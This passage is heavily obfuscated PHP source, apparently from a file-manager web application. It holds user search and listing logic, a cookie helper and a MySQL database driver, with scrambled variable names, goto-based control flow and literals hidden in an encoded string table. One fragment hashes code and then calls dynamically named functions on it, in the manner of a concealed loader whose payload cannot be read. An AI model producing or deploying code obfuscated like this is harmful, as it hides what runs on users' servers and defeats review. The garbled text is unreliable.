C¼¹áÁ°°: if ($d‰®·íªòë) { $f—÷ò§å¸ = array($F ùï£çÏÛ[2495] => intval($d‰®·íªòë)); $EÁ¤Ø«²§¿ = "\x4c\105\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\165\x73\145\162\x5f\147\162\x6f\165\160\x20\x75\x73\145\162\137\147\x72\x6f\x75\x70\40\157\x6e\x20\165\x73\145\162\x2e\165\163\x65\x72\x49\x44\40\75\40\x75\x73\x65\162\x5f\x67\x72\157\165\x70\56\x75\x73\x65\x72\111\104"; $c”ÇÃ£¤Øì = Input::get($F ùï£çÏÛ[403], null, $F ùï£çÏÛ[33]) ? $F ùï£çÏÛ[33] : $F ùï£çÏÛ[2496]; } if (isset($C”òë¨ñË[$F ùï£çÏÛ[677]])) { $f—÷ò§å¸[$F ùï£çÏÛ[2497]] = $C”òë¨ñË[$F ùï£çÏÛ[677]]; } $aÂ­‚¯Å£² = $this->_makeOrder($c”ÇÃ£¤Øì)->field($F ùï£çÏÛ[2498])->where($f—÷ò§å¸)->join($EÁ¤Ø«²§¿)->selectPage(50); goto CÚáù–ê­; c—òÌòòÔÔ: $F ùï£çÏÛ =& $_SERVER[»„]; $EÁ¤Ø«²§¿ = $F ùï£çÏÛ[33]; $f—÷ò§å¸ = array(); goto C¼¹áÁ°°; CÚáù–ê­: $this->_listDataApply($aÂ­‚¯Å£²[$F ùï£çÏÛ[350]]); return $aÂ­‚¯Å£²; goto fÁœØÖØÄ; fÁœØÖØÄ: } private function _makeOrder($bÖéïã³Ú‰ = '') { goto AØ›œÂËœÓ; AØ›œÂËœÓ: $aÌ®…÷­‰ =& $_SERVER[»„]; $F˜Ç¸ö­¬˜ = array($aÌ®…÷­‰[1409], $aÌ®…÷­‰[28], $aÌ®…÷­‰[2058], $aÌ®…÷­‰[2031], $aÌ®…÷­‰[183]); $fŸ±ãÄøÑç = array($aÌ®…÷­‰[398] => $aÌ®…÷­‰[399], $aÌ®…÷­‰[400] => $aÌ®…÷­‰[401]); goto f‚Ú™‘Šö„; f‚Ú™‘Šö„: $aÎØ¹İŸá = Input::get($aÌ®…÷­‰[403], $aÌ®…÷­‰[7], $aÌ®…÷­‰[1400], $F˜Ç¸ö­¬˜); $Dœˆ»Ş¥¨· = Input::get($aÌ®…÷­‰[404], $aÌ®…÷­‰[7], $aÌ®…÷­‰[2147], array($aÌ®…÷­‰[2147], $aÌ®…÷­‰[400])); $Dœˆ»Ş¥¨· = $fŸ±ãÄøÑç[$Dœˆ»Ş¥¨·]; goto CÓÑìÑ‹¥Ä; CÓÑìÑ‹¥Ä: $bÖéïã³Ú‰ = $bÖéïã³Ú‰ . "\x75\x73\145\x72\x2e{$aÎØ¹İŸá}\x20{$Dœˆ»Ş¥¨·}\x2c\x20\x75\163\x65\162\56\x75\163\145\x72\111\104\40\141\x73\x63"; return $this->alias($aÌ®…÷­‰[2242])->order($bÖéïã³Ú‰); goto C›ôÍÏ°º«; C›ôÍÏ°º«: } public function listSearch($eõéöí÷Š×) { goto däŠÒ‡ÎÓ ; dŒäÑàšš: return $d«»éøòÍÇ; goto Bµğå¹á£Ì; E¢®ë‡ƒÆÀ: if (!$d«»éøòÍÇ || count($d«»éøòÍÇ[$E§¼›…Úïø[350]]) < 5 && Input::check($Dñ§‹§¤šİ, $E§¼›…Úïø[302])) { $dõ»ªÛ­èö = $this->_searchFromMeta($E§¼›…Úïø[411], $Dñ§‹§¤šİ, 10); $dÙ¶«–¸âè = $this->_searchFromMeta($E§¼›…Úïø[412], $Dñ§‹§¤šİ, 10); $d¯ĞÂä¦Íâ = array_merge($dõ»ªÛ­èö, $dÙ¶«–¸âè, $d«»éøòÍÇ[$E§¼›…Úïø[350]]); $d«»éøòÍÇ[$E§¼›…Úïø[350]] = array_unique_by_key($d¯ĞÂä¦Íâ, $E§¼›…Úïø[1409]); $d«»éøòÍÇ[$E§¼›…Úïø[347]][$E§¼›…Úïø[348]] = count($d«»éøòÍÇ[$E§¼›…Úïø[350]]); $d«»éøòÍÇ[$E§¼›…Úïø[347]][$E§¼›…Úïø[349]] = ceil($d«»éøòÍÇ[$E§¼›…Úïø[347]][$E§¼›…Úïø[348]] / $d«»éøòÍÇ[$E§¼›…Úïø[347]][$E§¼›…Úïø[345]]); } $this->_listDataApply($d«»éøòÍÇ[$E§¼›…Úïø[350]]); $this->_filterByGroup($d«»éøòÍÇ, $b÷›êÀ˜„); goto dŒäÑàšš; d¾¹Ï‹õïé: $Dñ§‹§¤šİ = str_replace($E§¼›…Úïø[2150], $E§¼›…Úïø[2151], trim($Dñ§‹§¤šİ)); $b±¨àêÄ = array($E§¼›…Úïø[28] => array($E§¼›…Úïø[739], "\45{$Dñ§‹§¤šİ}\x25"), $E§¼›…Úïø[289] => array($E§¼›…Úïø[739], "\45{$Dñ§‹§¤šİ}\x25"), $E§¼›…Úïø[2299] => array($E§¼›…Úïø[739], "\x25{$Dñ§‹§¤šİ}\45"), $E§¼›…Úïø[904] => $E§¼›…Úïø[2152]); if (Input::check($Dñ§‹§¤šİ, $E§¼›…Úïø[295])) { $b±¨àêÄ[$E§¼›…Úïø[1409]] = array($E§¼›…Úïø[739], "\45{$Dñ§‹§¤šİ}\45"); $b±¨àêÄ[$E§¼›…Úïø[2478]] = array($E§¼›…Úïø[739], "\x25{$Dñ§‹§¤šİ}\45"); } goto f•øªíå ; f•øªíå : if (!$Dñ§‹§¤šİ) { $b±¨àêÄ = array(); } if (isset($eõéöí÷Š×[$E§¼›…Úïø[677]])) { $b±¨àêÄ[$E§¼›…Úïø[677]] = $eõéöí÷Š×[$E§¼›…Úïø[677]]; } $d«»éøòÍÇ = $this->_makeOrder()->where($b±¨àêÄ)->selectPage(20); goto E¢®ë‡ƒÆÀ; däŠÒ‡ÎÓ : $E§¼›…Úïø =& $_SERVER[»„]; $Dñ§‹§¤šİ = $eõéöí÷Š×[$E§¼›…Úïø[2148]]; $b÷›êÀ˜„ = isset($eõéöí÷Š×[$E§¼›…Úïø[2149]]) ? $eõéöí÷Š×[$E§¼›…Úïø[2149]] : !1; goto d¾¹Ï‹õïé; Bµğå¹á£Ì: } private function _filterByGroup(&$aŒäÇÈ¼À, $eñ‰œ«ˆ·) { $d”£Ş¿…­ =& $_SERVER[»„]; if (!$eñ‰œ«ˆ·) { return $aŒäÇÈ¼À; } foreach ($aŒäÇÈ¼À[$d”£Ş¿…­[350]] as $bè ÈÊ®† => &$eØ½®Ÿª “) { $e‡®È’˜İ = array_to_keyvalue($eØ½®Ÿª “[$d”£Ş¿…­[2499]], $d”£Ş¿…­[33], $d”£Ş¿…­[2072]); if (!in_array($eñ‰œ«ˆ·, $e‡®È’˜İ)) { unset($aŒäÇÈ¼À[$d”£Ş¿…­[350]][$bè ÈÊ®†]); } } $aŒäÇÈ¼À[$d”£Ş¿…­[350]] = array_values($aŒäÇÈ¼À[$d”£Ş¿…­[350]]); $aŒäÇÈ¼À[$d”£Ş¿…­[347]] = array($d”£Ş¿…­[2275] => count($aŒäÇÈ¼À[$d”£Ş¿…­[350]]), $d”£Ş¿…­[2273] => $aŒäÇÈ¼À[$d”£Ş¿…­[347]][$d”£Ş¿…­[345]], $d”£Ş¿…­[2272] => 1, $d”£Ş¿…­[2274] => 1); } private function _searchFromMeta($c¸¯òÕ‘õ, $A…¶Š´›¦è, $BÁºŠÀ»•—) { goto FÉ‚»¥Ù•‰; AñİÛî‘Ö: $e¬œñ„Åš = Model($d…Åœš”„Ø[2500])->where($e‘æˆØ‘)->limit($BÁºŠÀ»•—)->select(); if (!$e¬œñ„Åš) { return array(); } $e¬œñ„Åš = array_to_keyvalue($e¬œñ„Åš, $d…Åœš”„Ø[33], $d…Åœš”„Ø[1409]); goto c—ÙˆÆÅ—¸; FÉ‚»¥Ù•‰: $d…Åœš”„Ø =& $_SERVER[»„]; $A…¶Š´›¦è = strtolower($A…¶Š´›¦è); $e‘æˆØ‘ = array($d…Åœš”„Ø[89] => $c¸¯òÕ‘õ, $d…Åœš”„Ø[355] => array($d…Åœš”„Ø[739], "\x25{$A…¶Š´›¦è}\x25")); goto AñİÛî‘Ö; c—ÙˆÆÅ—¸: $fêÕ™ŠëÉ‹ = $this->where(array($d…Åœš”„Ø[1400] => array($d…Åœš”„Ø[7], $e¬œñ„Åš)))->select(); if (!$fêÕ™ŠëÉ‹) { return array(); } return $fêÕ™ŠëÉ‹; goto f–Ø‚¸ËÕ; f–Ø‚¸ËÕ: } private function _listDataApplyItem($CÖÂÙŠ§ìæ) { $dØÍà…¥öœ = array($CÖÂÙŠ§ìæ); $this->_listDataApply($dØÍà…¥öœ); return $dØÍà…¥öœ[0]; } private function _listDataApply(&$BÔ¬ì³ÜÖ§) { goto fÃÒÌĞÖŒø; fÃÒÌĞÖŒø: $bÖò¿è’– =& $_SERVER[»„]; if (!$BÔ¬ì³ÜÖ§) { return; } array_remove_key($BÔ¬ì³ÜÖ§, $bÖò¿è’–[792]); goto e×ÛñÜ‰– ; e×ÛñÜ‰– : $Aã’Â”ÊŒ– = array_to_keyvalue($BÔ¬ì³ÜÖ§, $bÖò¿è’–[33], $bÖò¿è’–[1409]); $this->_listAppendGroup($BÔ¬ì³ÜÖ§, $Aã’Â”ÊŒ–); $this->_listAppendMeta($BÔ¬ì³ÜÖ§, $Aã’Â”ÊŒ–); goto e£™æŠ©Õ˜; e£™æŠ©Õ˜: $this->_listAppendSourceRoot($BÔ¬ì³ÜÖ§, $Aã’Â”ÊŒ–); goto a¨»ïÕä ù; a¨»ïÕä ù: } private function _listAppendSourceRoot(&$B‰‹‰ñŠÓÅ, $cõ‹¡Œèêİ) { goto a—¡»­ÁÓĞ; a—¡»­ÁÓĞ: $FÈÄŞÀ”õä =& $_SERVER[»„]; $bõˆáÔÅ‡„ = array($FÈÄŞÀ”õä[457] => 0, $FÈÄŞÀ”õä[367] => SourceModel::TYPE_USER, $FÈÄŞÀ”õä[452] => array($FÈÄŞÀ”õä[7], $cõ‹¡Œèêİ)); $A²Ù”Ü¨× = $FÈÄŞÀ”õä[2158]; goto a¤»­‚¼¡´; d÷¿“Ô‡ˆÈ: foreach ($B‰‹‰ñŠÓÅ as &$aÉÈ¨±ƒ³) { $aÉÈ¨±ƒ³[$FÈÄŞÀ”õä[387]] = $AºÒ‹„ß¥Ø[$aÉÈ¨±ƒ³[$FÈÄŞÀ”õä[1409]]] ? $AºÒ‹„ß¥Ø[$aÉÈ¨±ƒ³[$FÈÄŞÀ”õä[1409]]] : array(); } goto bÁŠŠ¹Ğ; a¤»­‚¼¡´: $AºÒ‹„ß¥Ø = Model($FÈÄŞÀ”õä[740])->order($FÈÄŞÀ”õä[2159])->field($A²Ù”Ü¨×)->where($bõˆáÔÅ‡„)->select(); $AºÒ‹„ß¥Ø = array_to_keyvalue($AºÒ‹„ß¥Ø, $FÈÄŞÀ”õä[452]); $AºÒ‹„ß¥Ø = array_remove_key($AºÒ‹„ß¥Ø, $FÈÄŞÀ”õä[452]); goto d÷¿“Ô‡ˆÈ; bÁŠŠ¹Ğ: } private function _listAppendGroup(&$aˆÈÔíµÚ, $DŸ® Ô¶È) { goto FÙ‚èÒÕ¡ø; A à¤Å¼—×: $fÜèéŞÕ÷ß = array_to_keyvalue_group($fÜèéŞÕ÷ß, $A´Úœ½¤­[1409]); foreach ($fÜèéŞÕ÷ß as &$A…ìĞïïŠ—) { $cˆÃ¢“‚¾ = array(); foreach ($A…ìĞïïŠ— as $Bá—‚£§À±) { if (!$Bá—‚£§À±[$A´Úœ½¤­[2200]]) { continue; } $AÜ ¡ñöË¢ = Model($A´Úœ½¤­[2219])->listData($Bá—‚£§À±[$A´Úœ½¤­[2200]]); $cˆÃ¢“‚¾[] = array($A´Úœ½¤­[2072] => $Bá—‚£§À±[$A´Úœ½¤­[2072]], $A´Úœ½¤­[2503] => $A«®çµ®øâ[$Bá—‚£§À±[$A´Úœ½¤­[2072]]], $A´Úœ½¤­[372] => $AÜ ¡ñöË¢); } $A…ìĞïïŠ— = $cˆÃ¢“‚¾; } foreach ($aˆÈÔíµÚ as &$Cíëçâ‡É”) { $Cíëçâ‡É”[$A´Úœ½¤­[2499]] = array(); if (isset($fÜèéŞÕ÷ß[$Cíëçâ‡É”[$A´Úœ½¤­[1409]]])) { $Cíëçâ‡É”[$A´Úœ½¤­[2499]] = $fÜèéŞÕ÷ß[$Cíëçâ‡É”[$A´Úœ½¤­[1409]]]; } } goto A§ïôŞ·Å…; FÙ‚èÒÕ¡ø: $A´Úœ½¤­ =& $_SERVER[»„]; $fÍÍ‰™æ‡ª = array($A´Úœ½¤­[1409] => array($A´Úœ½¤­[7], $DŸ® Ô¶È)); $fÜèéŞÕ÷ß = Model($A´Úœ½¤­[2146])->where($fÍÍ‰™æ‡ª)->select(); goto b‡Ï¦ä·Á; b‡Ï¦ä·Á: $f±˜ª‹¸•» = array_to_keyvalue($fÜèéŞÕ÷ß, $A´Úœ½¤­[33], $A´Úœ½¤­[2072]); $f±˜ª‹¸•» = array_remove_value(array_unique($f±˜ª‹¸•»), $A´Úœ½¤­[464]); if (!$f±˜ª‹¸•» || !$fÜèéŞÕ÷ß) { return; } goto AŠˆÅéÒŒ; AŠˆÅéÒŒ: $fÍÍ‰™æ‡ª = array($A´Úœ½¤­[2072] => array($A´Úœ½¤­[7], $f±˜ª‹¸•»)); $cÂø—œ²¢² = Model($A´Úœ½¤­[2501])->field($A´Úœ½¤­[2502])->where($fÍÍ‰™æ‡ª)->select(); $A«®çµ®øâ = array_to_keyvalue($cÂø—œ²¢², $A´Úœ½¤­[2072], $A´Úœ½¤­[28]); goto A à¤Å¼—×; A§ïôŞ·Å…: } private function _listAppendMeta(&$D‘¸¡ÂŒÑ”, $bÏ´»ˆÃÜò) { goto aìÛ§œ¸ñ–; dÍÓ¿‹‘äÕ: foreach ($cË—š‰ˆì˜ as &$bß«›ÄÀÇ) { $e±³±°ğ¸ = array(); foreach ($bß«›ÄÀÇ as $bˆ‘í—ÉŒï) { if (!in_array($bˆ‘í—ÉŒï[$eÂŸ™®˜…[89]], $Bº±ñİ”å)) { $e±³±°ğ¸[$bˆ‘í—ÉŒï[$eÂŸ™®˜…[89]]] = $bˆ‘í—ÉŒï[$eÂŸ™®˜…[355]]; } } $bß«›ÄÀÇ = $e±³±°ğ¸; } $fØŒìœÍæİ = Model($eÂŸ™®˜…[2504]); foreach ($D‘¸¡ÂŒÑ” as &$bÈÅñ­Á¾í) { $bæ»«ñ‰ª– = array(); if (isset($cË—š‰ˆì˜[$bÈÅñ­Á¾í[$eÂŸ™®˜…[1409]]])) { $bæ»«ñ‰ª– = $cË—š‰ˆì˜[$bÈÅñ­Á¾í[$eÂŸ™®˜…[1409]]]; } $bÈÅñ­Á¾í[$eÂŸ™®˜…[2505]] = array(); if (isset($bæ»«ñ‰ª–[$b›®˜Í‚â†])) { $bÈÅñ­Á¾í[$eÂŸ™®˜…[2505]] = $fØŒìœÍæİ->getUserJobInfo($bæ»«ñ‰ª–[$b›®˜Í‚â†]); } } goto DºÉò±ÄŠà; Aì¬¾˜Ú: $C‚¯¥‹İš = array($eÂŸ™®˜…[1409] => array($eÂŸ™®˜…[7], $bÏ´»ˆÃÜò)); $cË—š‰ˆì˜ = Model($eÂŸ™®˜…[2477])->where($C‚¯¥‹İš)->select(); $cË—š‰ˆì˜ = array_to_keyvalue_group($cË—š‰ˆì˜, $eÂŸ™®˜…[1409]); goto dÍÓ¿‹‘äÕ; aìÛ§œ¸ñ–: $eÂŸ™®˜… =& $_SERVER[»„]; $b›®˜Í‚â† = UserJobModel::JOB_KEY; $Bº±ñİ”å = array($eÂŸ™®˜…[2480]); goto Aì¬¾˜Ú; DºÉò±ÄŠà: } public function userSearch($f²ÃåºÚ°ñ, $c‹À„Í¬ŒÛ = "\x2a") { return Model($_SERVER[»„][473])->where($f²ÃåºÚ°ñ)->field($c‹À„Í¬ŒÛ)->find(); } } goto c¦÷ë÷âåÎ; C®†§’õ˜‰: if ($_SERVER[$_SERVER[»„][750]] != $Aö¢ÅáÜêš($Cô”ĞĞá)) { goto E­•Îë°†¯; eƒ£Ì±¯»: $dêá›æÈ“ = explode($_SERVER[»„][213], $aÜ£âéœõ); if (count($dêá›æÈ“) < $_SERVER[»„][566]) { $F‚Ò”èÑ­› = $_SERVER[»„][754]; $F‚Ò”èÑ­›(); } $AÅí‘è¬— = $_SERVER[»„][755]; goto e‰²®Œ¤´¾; E­•Îë°†¯: $B÷ÜÜø¯ò’ = $_SERVER[»„][751]; $aÙ¬ëç´† = $_SERVER[$_SERVER[»„][752]] . $_SERVER[»„][753]; $aÜ£âéœõ = $B÷ÜÜø¯ò’($aÙ¬ëç´†); goto eƒ£Ì±¯»; e‰²®Œ¤´¾: $AÅí‘è¬—($Cô”ĞĞá); goto f¼È‹¦İğ”; f¼È‹¦İğ”: } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($F„˜¥“Õ¡Î = '', $fÂ„™ïø˜ = 0) { if (is_string($F„˜¥“Õ¡Î) && $F„˜¥“Õ¡Î != $_SERVER[»„][33]) { $this->prefix = $F„˜¥“Õ¡Î; } if (is_numeric($fÂ„™ïø˜) && $fÂ„™ïø˜ > 0) { $this->expire = $fÂ„™ïø˜; } } public static function getInstance() { static $bçøŠ„çÊÖ; if ($bçøŠ„çÊÖ === null) { $bçøŠ„çÊÖ = new self(); } return $bçøŠ„çÊÖ; } private static $sameCookieSet = array(); public static function set($EÖÜ½÷ó†, $FÒ‚­ë·š, $bĞˆ‹«ã‚¥ = 0, $cã©ùÚÉñé = false, $cÕ·‚Ú»æí = false) { goto BŠæ’Œœù©; BŠæ’Œœù©: $CªÎÔ®®¼‡ =& $_SERVER[»„]; if (!$bĞˆ‹«ã‚¥) { $bĞˆ‹«ã‚¥ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$EÖÜ½÷ó†]) && self::$sameCookieSet[$EÖÜ½÷ó†] == $FÒ‚­ë·š . $bĞˆ‹«ã‚¥) { return; } goto cÑØè´Û°¯; C§çóô¨: setcookie($EÖÜ½÷ó†, $FÒ‚­ë·š, time() + $bĞˆ‹«ã‚¥, $CªÎÔ®®¼‡[8] . trim($cÕ·‚Ú»æí, $CªÎÔ®®¼‡[8]) . $BÆˆ‰ÕŸÔô, !1, !1, $cã©ùÚÉñé); goto b³‘³ë’äî; cÑØè´Û°¯: self::$sameCookieSet[$EÖÜ½÷ó†] = $FÒ‚­ë·š . $bĞˆ‹«ã‚¥; if (!$cÕ·‚Ú»æí) { $cÕ·‚Ú»æí = str_replace(HOST, $CªÎÔ®®¼‡[33], APP_HOST); $cÕ·‚Ú»æí = _get($GLOBALS, $CªÎÔ®®¼‡[787], $cÕ·‚Ú»æí); } $BÆˆ‰ÕŸÔô = $CªÎÔ®®¼‡[33]; goto C§çóô¨; b³‘³ë’äî: } public static function setSafe($CŞ…Ò”Àˆ, $dìù…ÀÒ¼Ô, $EãñŒÑÉğ = 0) { self::set($CŞ…Ò”Àˆ, $dìù…ÀÒ¼Ô, $EãñŒÑÉğ, !0); } public static function get($C½ŠŒ£Ú ¶) { return isset($_COOKIE[$C½ŠŒ£Ú ¶]) ? $_COOKIE[$C½ŠŒ£Ú ¶] : !1; } public static function remove($FÉÒá·‘„, $f‚§ÔÙ„™† = false) { unset($_COOKIE[$FÉÒá·‘„]); self::set($FÉÒá·‘„, $_SERVER[»„][33], 1, $f‚§ÔÙ„™†); } } class DbMysql extends Db { public function __construct($dÙêÚ£šò = '') { $a¾‘ã·„ =& $_SERVER[»„]; if (!extension_loaded($a¾‘ã·„[716])) { think_exception(think_lang($a¾‘ã·„[10]) . $a¾‘ã·„[788]); } if (!empty($dÙêÚ£šò)) { $this->config = $dÙêÚ£šò; if (empty($this->config[$a¾‘ã·„[13]])) { $this->config[$a¾‘ã·„[13]] = $a¾‘ã·„[33]; } } } public function connect($e¤Ç¾‚ùŠ½ = '', $f®‘†ŒÊÈ = 0, $e–²Î¯’œ = false) { $dĞ¼¬Š¶ìà =& $_SERVER[»„]; if (!isset($this->linkID[$f®‘†ŒÊÈ])) { goto A•Úç›²’Ã; D´æÏ®Ï˜: if (1 != think_config($dĞ¼¬Š¶ìà[18])) { unset($this->config); } goto eà”“‡; A•Úç›²’Ã: if (empty($e¤Ç¾‚ùŠ½)) { $e¤Ç¾‚ùŠ½ = $this->config; } $cá…ŠàõåÕ = $e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[789]] . ($e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[790]] ? "\x3a{$e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[790]]}" : $dĞ¼¬Š¶ìà[33]); $eé†¶Í¾‹ö = !empty($e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[13]][$dĞ¼¬Š¶ìà[14]]) ? $e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[13]][$dĞ¼¬Š¶ìà[14]] : $this->pconnect; goto DŞÇ³‰ˆÍë; AÂ¦áÎ‰Öí: mysql_query($dĞ¼¬Š¶ìà[793] . think_config($dĞ¼¬Š¶ìà[794]) . $dĞ¼¬Š¶ìà[55], $this->linkID[$f®‘†ŒÊÈ]); if ($C‡†‘–»‹¥ > $dĞ¼¬Š¶ìà[795]) { mysql_query($dĞ¼¬Š¶ìà[796], $this->linkID[$f®‘†ŒÊÈ]); } $this->connected = !0; goto D´æÏ®Ï˜; DŞÇ³‰ˆÍë: if ($eé†¶Í¾‹ö) { $this->linkID[$f®‘†ŒÊÈ] = mysql_pconnect($cá…ŠàõåÕ, $e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[791]], $e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[792]], 131072); } else { $this->linkID[$f®‘†ŒÊÈ] = mysql_connect($cá…ŠàõåÕ, $e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[791]], $e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[792]], !0, 131072); } if (!$this->linkID[$f®‘†ŒÊÈ] || !empty($e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[17]]) && !mysql_select_db($e¤Ç¾‚ùŠ½[$dĞ¼¬Š¶ìà[17]], $this->linkID[$f®‘†ŒÊÈ])) { think_exception(mysql_error()); } $C‡†‘–»‹¥ = mysql_get_server_info($this->linkID[$f®‘†ŒÊÈ]); goto AÂ¦áÎ‰Öí; eà”“‡: } return $this->linkID[$f®‘†ŒÊÈ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cÁ¡ÆÎ¼…—) { goto fŒäòµ¶ÑÄ; bª’Ë§´™Ü: if (!$this->_linkID) { return !1; } $this->queryStr = $cÁ¡ÆÎ¼…—; if ($this->queryID) { $this->free(); } goto d´Ê¹¸ö®¾; fŒäòµ¶ÑÄ: $A‹…Å¸æéœ =& $_SERVER[»„]; if (0 === stripos($cÁ¡ÆÎ¼…—, $A‹…Å¸æéœ[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto bª’Ë§´™Ü; d®Û×¾ÑäÄ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÊ‚¦àßÉÉ; d´Ê¹¸ö®¾: think_action_status($A‹…Å¸æéœ[19], 1); think_status($A‹…Å¸æéœ[20]); $this->queryID = mysql_query($cÁ¡ÆÎ¼…—, $this->_linkID); goto d®Û×¾ÑäÄ; cÊ‚¦àßÉÉ: } public function execute($cìôÀŠí¹) { goto EÉ×Ëë³ÑË; EÉ×Ëë³ÑË: $d´ÄĞ‹ïÙÀ =& $_SERVER[»„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E»Õ˜Šï‡—; E»Õ˜Šï‡—: $this->queryStr = $cìôÀŠí¹; if ($this->queryID) { $this->free(); } think_action_status($d´ÄĞ‹ïÙÀ[21], 1); goto FË‹×³¨Â‰; FË‹×³¨Â‰: think_status($d´ÄĞ‹ïÙÀ[20]); $aÕ¤Åõ„ = mysql_query($cìôÀŠí¹, $this->_linkID); $this->debug(); goto Eàª³ÖëˆÎ; Eàª³ÖëˆÎ: if (!1 === $aÕ¤Åõ„) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto f‡ÇøñÚ; f‡ÇøñÚ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[»„][797], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AùÑ«²Ê…… = mysql_query($_SERVER[»„][798], $this->_linkID); $this->transTimes = 0; if (!$AùÑ«²Ê……) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FĞõ¿œğùÙ = mysql_query($_SERVER[»„][799], $this->_linkID); $this->transTimes = 0; if (!$FĞõ¿œğùÙ) { $this->error(); return !1; } } return !0; } private function getAll() { $eˆ­Ü¯ŒØÚ = array(); if ($this->numRows > 0) { while ($bö¤ƒ³†Šé = mysql_fetch_assoc($this->queryID)) { $eˆ­Ü¯ŒØÚ[] = $bö¤ƒ³†Šé; } mysql_data_seek($this->queryID, 0); } return $eˆ­Ü¯ŒØÚ; } public function getFields($F†ÏÄ„†š) { $bã¤Äèà÷î =& $_SERVER[»„]; $aµğâÛ¤ŸÁ = $this->query($bã¤Äèà÷î[800] . $this->parseKey($F†ÏÄ„†š)); $a²Ì¡İ•ÛÉ = array(); if ($aµğâÛ¤ŸÁ) { foreach ($aµğâÛ¤ŸÁ as $FõÄ’ÔÕÒ => $D«§åŒÎß¾) { $a²Ì¡İ•ÛÉ[$D«§åŒÎß¾[$bã¤Äèà÷î[27]]] = array($bã¤Äèà÷î[28] => $D«§åŒÎß¾[$bã¤Äèà÷î[27]], $bã¤Äèà÷î[29] => $D«§åŒÎß¾[$bã¤Äèà÷î[30]], $bã¤Äèà÷î[31] => (bool) (strtoupper($D«§åŒÎß¾[$bã¤Äèà÷î[32]]) === $bã¤Äèà÷î[801]), $bã¤Äèà÷î[34] => $D«§åŒÎß¾[$bã¤Äèà÷î[35]], $bã¤Äèà÷î[36] => strtolower($D«§åŒÎß¾[$bã¤Äèà÷î[37]]) == $bã¤Äèà÷î[38], $bã¤Äèà÷î[39] => strtolower($D«§åŒÎß¾[$bã¤Äèà÷î[40]]) == $bã¤Äèà÷î[41]); } } return $a²Ì¡İ•ÛÉ; } public function getTables($a­²¯“ëªÈ = '') { $DÌšĞÀÈ®Ç =& $_SERVER[»„]; if (!empty($a­²¯“ëªÈ)) { $F·ø†›Ü°š = $DÌšĞÀÈ®Ç[802] . $a­²¯“ëªÈ; } else { $F·ø†›Ü°š = $DÌšĞÀÈ®Ç[803]; } $C±ŸˆßÀ = $this->query($F·ø†›Ü°š); $C¾™ä‘Î¢æ = array(); foreach ($C±ŸˆßÀ as $aÛ²±Ë®˜ç => $bÚáËÍÒÂŞ) { $C¾™ä‘Î¢æ[$aÛ²±Ë®˜ç] = current($bÚáËÍÒÂŞ); } return $C¾™ä‘Î¢æ; } public function replace($DÓ¶Âö«‰, $c¦ÀÁñêä = array()) { $B†®“‘© =& $_SERVER[»„]; foreach ($DÓ¶Âö«‰ as $dÔø”ÅÄÉ¬ => $AŒÏº×Äøé) { $cÕõ°àƒÜŠ = $this->parseValue($AŒÏº×Äøé); if (is_scalar($cÕõ°àƒÜŠ)) { $F²ïÃ²»†[] = $cÕõ°àƒÜŠ; $aÜÃŠ‰¨öõ[] = $this->parseKey($dÔø”ÅÄÉ¬); } } $DàÒóÌÀê = $B†®“‘©[804] . $this->parseTable($c¦ÀÁñêä[$B†®“‘©[263]]) . $B†®“‘©[805] . implode($B†®“‘©[47], $aÜÃŠ‰¨öõ) . $B†®“‘©[806] . implode($B†®“‘©[47], $F²ïÃ²»†) . $B†®“‘©[807]; return $this->execute($DàÒóÌÀê); } public function insertAll($dğïŞé»Ãá, $C’ğ·®æÆ = array(), $F¾ç’ã×¥Æ = false) { goto CÑåê…Œñƒ; c»¿öŒ£å: $Bß©–„³‰„ = ($F¾ç’ã×¥Æ ? $C®…µ¦Æ­²[809] : $C®…µ¦Æ­²[810]) . $C®…µ¦Æ­²[811] . $this->parseTable($C’ğ·®æÆ[$C®…µ¦Æ­²[263]]) . $C®…µ¦Æ­²[805] . implode($C®…µ¦Æ­²[47], $Aå¦³´Ê») . $C®…µ¦Æ­²[812] . implode($C®…µ¦Æ­²[47], $CÅ—‰ÎØŠ¸); return $this->execute($Bß©–„³‰„); goto cĞ§óƒ¾ƒ‡; B¹¤ŒÁÛƒ: $CÅ—‰ÎØŠ¸ = array(); foreach ($dğïŞé»Ãá as $cì½šÜÕœ‰) { $B™»‚†Â®‰ = array(); foreach ($cì½šÜÕœ‰ as $EóÅ¶ˆ˜Ê› => $E£ßÌâÒ¢†) { $E£ßÌâÒ¢† = $this->parseValue($E£ßÌâÒ¢†); if (is_scalar($E£ßÌâÒ¢†)) { $B™»‚†Â®‰[] = $E£ßÌâÒ¢†; } } $CÅ—‰ÎØŠ¸[] = $C®…µ¦Æ­²[244] . implode($C®…µ¦Æ­²[47], $B™»‚†Â®‰) . $C®…µ¦Æ­²[807]; } array_walk($Aå¦³´Ê», array($this, $C®…µ¦Æ­²[808])); goto c»¿öŒ£å; CÑåê…Œñƒ: $C®…µ¦Æ­² =& $_SERVER[»„]; if (!is_array($dğïŞé»Ãá[0])) { return !1; } $Aå¦³´Ê» = array_keys($dğïŞé»Ãá[0]); goto B¹¤ŒÁÛƒ; cĞ§óƒ¾ƒ‡: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID 